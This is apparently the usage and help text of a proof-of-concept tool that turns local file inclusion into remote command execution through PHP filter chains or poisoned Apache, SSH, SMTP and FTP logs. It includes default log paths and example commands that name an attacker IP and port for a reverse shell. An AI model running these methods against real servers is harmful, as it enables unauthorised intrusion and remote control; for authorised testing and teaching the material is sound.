Local File Inclusion To Remote Command Execution (PoC)  
```
lfi2rce - Local File Inclusion To Remote Code Execution v1.1 by 0bfxgh0st*

Usage python3 lfi2rce -u <lfi vulnerable url> -t <poison type> -r <attacker ip> -p <attacker port>

Options:

    -u, --url <url>                          Url (Url must contain LFI vulnerable parameter if not --cookie-mode or --data-mode flag is set)
    -t, --poison-type <poison type>          Poison scheme (filterchain,apache,ssh,ftp,smtp)
    -r, --host <ip>                          Our machine IP address
    -p, --port <port>                        Our machine port
    -X, --method <method>                    Select request method
    -d, --data <dict>                        Send HTTP post data
    -l, --log <log file>                     Log file to poison
    -H, --headers <dict>                     HTTP headers
    -c, --cookies <dict>                     Send cookies
    --cookie-mode <key>                      LFI2RCE via cookies
    --data-mode <key>                        LFI2RCE via data
    --basic-auth <user> <password>           Basic HTTP authentication
    --ssh-port <n>                           Remote SSH port
    --ftp-port <n>                           Remote FTP port
    --smtp-port <n>                          Remote SMTP port
    --proxy <proxy>                          Use proxies
    --proxy-file <file>                      Read proxies from input file
    --delay <n>                              Set delay time in seconds between retry requests
    -h, --help                               Show help panel
    -e, --examples                           Show help panel with use examples

Poison/lfi2rce types:

    filterchain           linux php filter chain            (*** no file or log needed ***)
    apache-lin            linux apache log poison           (default path: /var/log/apache2/access.log)
    ssh-lin               linux ssh log poison              (default path: /var/log/auth.log)
    smtp-lin              linux smtp log poison             (default path: /var/log/mail.log)
    ftp-lin               linux ftp log poison              (default path: /var/log/vsftpd.log)
    apache-win            windows apache log poison         (default path: C:/xampp/apache/logs/access.log)
    ssh-win               windows ssh log poison            (default path: C:/ProgramData/ssh/logs/sshd.log)
    smtp-win              windows smtp log poison           (default path: C:/xampp/MercuryMail/LOGS/MERCURYS.LOG)
    ftp-win               windows ftp log poison            (default path: C:/inetpub/logs/LogFiles/FTPSVC1/u_ex991231.log)

Examples:

    python3 lfi2rce -u "http://ghost.server/index.php?query=" -t filterchain -r 10.0.2.15 -p 1337
    python3 lfi2rce -u "http://ghost.server/index.php?query=" -t filterchain -r 10.0.2.15 -p 1337 --cookie-mode id
    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 -l /var/log/apache2/error.log 
    python3 lfi2rce -u "http://ghost.server/index.php?page=" -t ssh-win -r 10.0.2.15 -p 1337
    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t smtp-lin -r 10.0.2.15 -p 1337 -l /var/mail/secure/mail.log
    python3 lfi2rce -u "http://ghost.server/index.php?search=" -t ftp-win -r 10.0.2.15 -p 1337
    python3 lfi2rce -u "http://ghost.winserver/index.php?s=" -t apache-win -r 10.0.2.15 -p 1337 -X POST -d '{"id":"0","role":"admin"}'
    python3 lfi2rce -u "http://ghost.server/index.php" -t ftp-lin -r 10.0.2.15 -p 1337 --cookie-mode session --cookies '{"id":"1","role":"user"}'
    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-win -r 10.0.2.15 -p 1337 --headers '{"User-Agent":"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466","connection":"keep-alive"}'
    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 --proxy "http://127.0.0.1:8080,https://127.0.0.1:5473,socks5://127.0.0.1:4213"
    python3 lfi2rce -u "http://ghost.server/index.php?file=" -t apache-lin -r 10.0.2.15 -p 1337 --proxy-file proxies.txt

```
